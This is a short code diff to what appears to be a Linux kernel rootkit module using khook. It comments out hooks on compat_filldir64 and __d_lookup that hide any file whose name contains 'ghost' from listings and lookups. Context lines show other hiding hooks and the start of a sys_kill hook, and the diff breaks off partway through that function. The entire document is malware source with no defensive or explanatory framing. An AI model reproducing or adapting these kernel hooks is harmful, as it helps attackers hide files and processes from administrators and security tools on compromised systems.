@@ -211,31 +211,31 @@ static int khook_compat_fillonedir(void *__buf, const char *name, int namlen,
 	return ret;
 }
 
-#if LINUX_VERSION_CODE < KERNEL_VERSION(4, 12, 0)
-KHOOK_EXT(int, compat_filldir64, void *buf, const char *, int, loff_t, u64, unsigned int);
-static int khook_compat_filldir64(void *__buf, const char *name, int namlen,
-				  loff_t offset, u64 ino, unsigned int d_type)
-{
-	int ret = 0;
-	if (!strstr(name, "ghost"))
-		ret = KHOOK_ORIGIN(compat_filldir64, __buf, name, namlen, offset, ino, d_type);
-	return ret;
-}
-#endif
+// #if LINUX_VERSION_CODE < KERNEL_VERSION(4, 12, 0)
+// KHOOK_EXT(int, compat_filldir64, void *buf, const char *, int, loff_t, u64, unsigned int);
+// static int khook_compat_filldir64(void *__buf, const char *name, int namlen,
+// 				  loff_t offset, u64 ino, unsigned int d_type)
+// {
+// 	int ret = 0;
+// 	if (!strstr(name, "ghost"))
+// 		ret = KHOOK_ORIGIN(compat_filldir64, __buf, name, namlen, offset, ino, d_type);
+// 	return ret;
+// }
+// #endif
 
-#if LINUX_VERSION_CODE >= KERNEL_VERSION(3, 9, 0)
-KHOOK_EXT(struct dentry *, __d_lookup, const struct dentry *, const struct qstr *);
-struct dentry *khook___d_lookup(const struct dentry *parent, const struct qstr *name)
-#else
-KHOOK_EXT(struct dentry *, __d_lookup, struct dentry *, struct qstr *);
-struct dentry *khook___d_lookup(struct dentry *parent, struct qstr *name)
-#endif
-{
-	struct dentry *found = NULL;
-	if (!strstr(name->name, "ghost"))
-		found = KHOOK_ORIGIN(__d_lookup, parent, name);
-	return found;
-}
+// #if LINUX_VERSION_CODE >= KERNEL_VERSION(3, 9, 0)
+// KHOOK_EXT(struct dentry *, __d_lookup, const struct dentry *, const struct qstr *);
+// struct dentry *khook___d_lookup(const struct dentry *parent, const struct qstr *name)
+// #else
+// KHOOK_EXT(struct dentry *, __d_lookup, struct dentry *, struct qstr *);
+// struct dentry *khook___d_lookup(struct dentry *parent, struct qstr *name)
+// #endif
+// {
+// 	struct dentry *found = NULL;
+// 	if (!strstr(name->name, "ghost"))
+// 		found = KHOOK_ORIGIN(__d_lookup, parent, name);
+// 	return found;
+// }
 
 KHOOK_EXT(long, sys_kill, pid_t, int);
 static long khook_sys_kill(pid_t pid, int sig) {
